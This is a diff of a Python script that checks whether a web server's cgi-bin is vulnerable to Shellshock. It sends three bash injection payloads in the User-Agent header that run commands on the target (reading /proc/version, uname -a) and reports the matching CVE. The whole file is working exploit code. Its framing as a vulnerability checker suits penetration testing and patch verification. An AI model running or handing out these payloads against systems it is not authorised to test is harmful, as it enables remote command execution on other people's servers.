@@ -1,34 +1,72 @@
-# http_shellshock.py
-# description: checks for Bash Specially-crafted Environment Variables Code Injection Vulnerability
-# reference: http://www.exploit-db.com/exploits/34766/
+# httpshellshock.py
+# description: Checks if the cgi-bin of the target is vulnerable to Shellshockc
 # author: @shipcod3
 
 import sys, requests
 
-def usage():
-    print "\n Usage: python http_shellshock.py http://localhost/cgi-bin/batibot"
-
-def main(argv):
-    if len(argv) < 2:
-        return usage()
-
-    url = sys.argv[1]
-
-    headers = {
-               "User-Agent": "() { :;}; echo 'shellshocked!",
-               "Referer": "() { :;}; echo 'shellshocked!"
-              }
+def shellshock():
+    payloads = {
+                "() { :;}; echo 'shellshocked: ' $(</proc/version)",
+                "true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo 'shellshockedstacked: ' $(</proc/version)",
+                "() { _; } >_[$($())] { echo shellshockeduname; uname -a; }"                
+               }   
     
-    try:
-        r = requests.get(url, headers=headers)
-        print r.headers
-        if 'shellshocked' in r.headers:
-            print '[-] Vulnerable to Shellshock!'
-        else:
-            print '[-] Not Vulnerable!'
+    print 'Set RHOST:',
+    rhost = raw_input() #example: shellshock.notsosecure.com/cgi-bin/status
+    print 'Set RPORT:',
+    rport = raw_input()
+    print ""
+    
+    if rport == '80':
+        try:
+            for payload in payloads:
+                r = requests.get("http://{}".format(rhost), headers={"User-agent": payload})
+                print "Sending the payload: " + payload + " in User-Agent"
+                
+                if 'shellshocked' in r.headers:
+                    print "[+] Information: " + r.headers['shellshocked']
+                    print '[+] Vulnerable to Shellshock! (CVE-2014-6271)'
+                
+                elif 'shellshockedstacked' in r.headers:
+                    print "[+] Information: " + r.headers['shellshockedstacked']
+                    print '[+] Vulnerable to Shellshock! (CVE-2014-7186)'
+                
+                elif 'shellshockeduname' in r.headers:
+                    print "[+] Information: " + r.headers['shellshockeduname']
+                    print '[+] Vulnerable to Shellshock! (CVE-2014-6278)'              
+                    
+                else:
+                    print '[-] Not Vulnerable!'
 
-    except Exception as e:
-        print "[+] Not Vulnerable!"
+        except Exception as e:
+            print "[+] Not Vulnerable!"
+            
+    elif rport == '443':
+        try:
+            for payload in payloads:
+                r = requests.get("https://{}".format(rhost), headers={"User-agent": payload})
+                print "Sending the payload: " + payload + " in User-Agent"
+                
+                if 'shellshocked' in r.headers:
+                    print "[+] Information: " + r.headers['shellshocked']
+                    print '[+] Vulnerable to Shellshock! (CVE-2014-6271)'
+                    
+                elif 'shellshockedstacked' in r.headers:
+                    print "[+] Information: " + r.headers['shellshockedstacked']
+                    print '[+] Vulnerable to Shellshock! (CVE-2014-7186)'
+                    
+                elif 'shellshockeduname' in r.headers:
+                    print "[+] Information: " + r.headers['shellshockeduname']
+                    print '[+] Vulnerable to Shellshock! (CVE-2014-6278)'
+                    
+                else:
+                    print '[-] Not Vulnerable!'
+
+        except Exception as e:
+            print "[+] Not Vulnerable!"
+
+    else:
+        print ('[!!!] Error: No port has been specified')
 
 if __name__ == "__main__":
-    main(sys.argv)
+    shellshock()
